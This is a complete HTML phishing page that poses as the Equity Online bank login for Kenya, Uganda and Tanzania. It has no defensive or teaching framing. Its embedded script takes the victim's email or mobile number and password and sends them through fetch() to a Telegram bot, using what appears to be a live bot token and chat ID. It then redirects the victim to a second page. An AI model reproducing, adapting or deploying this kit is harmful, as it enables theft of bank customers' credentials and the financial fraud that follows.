<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Equity Online</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            display: flex;
            flex-direction: column;
            /* Stack sections vertically */
            height: 100vh;
            background-color: #f7f7f7;
        }
        
        .left-section {
            flex: 2;
            background: #C8102E;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 40px;
            color: white;
            text-align: center;
            /* Center text for mobile */
        }
        
        .right-section {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-form {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
            margin: auto;
            /* Center the form */
        }
        
        .login-form h2 {
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        input[type="text"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #C8102E;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }
        
        button:hover {
            background-color: #A50F20;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        
        .footer a {
            color: #C8102E;
            text-decoration: none;
        }
        
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
        /* Responsive Styles */
        
        @media (max-width: 768px) {
            .left-section {
                padding: 20px;
            }
            .login-form {
                padding: 15px;
            }
        }
        
        @media (max-width: 480px) {
            .left-section {
                padding: 10px;
            }
            .login-form {
                padding: 10px;
            }
            .logo {
                max-width: 100px;
                /* Smaller logo for mobile */
            }
        }
    </style>
</head>

<body>

    <div class="left-section">
        <div>
            <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
            <h1>Welcome to Equity Online</h1>
            <p>More than just banking.</p>
        </div>
    </div>

    <div class="right-section">
        <div class="login-form">
            <h2>Login Equity As on App</h2>
            <div class="form-group">
                <label for="country">Country</label>
                <select id="country">
                    <option value="Kenya">Kenya</option>
                    <option value="Uganda">Uganda</option>
                    <option value="Tanzania">Tanzania</option>
                </select>
            </div>
            <div class="form-group">
                <label for="email">Email address or mobile number</label>
                <input type="text" id="email" placeholder="Email address or mobile number" required>
            </div>
            <div class="form-group">
                <label for="password">Enter password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>
            <button id="signin-button">Login Equity</button>
            <p class="footer"><a href="#">Forgot your password?</a> | <a href="#">Register</a></p>
            <p class="footer">English</p>
        </div>
    </div>

    <script>
        document.getElementById('signin-button').addEventListener('click', function() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (email && password) {
                // Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual bot token and chat ID
                const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
                const chatId = '5615316142';
                const message = `Email: ${email}\nPassword: ${password}`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    })
                    .then(response => {
                        if (response.ok) {
                            // Optional: Redirect to equity1.html after sending
                            window.location.href = "equity1.html";
                        } else {
                            alert('Error sending data to Telegram.');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Error sending data to Telegram.');
                    });
            } else {
                alert('Please fill in all fields.');
            }
        });
    </script>
</body>

</html>
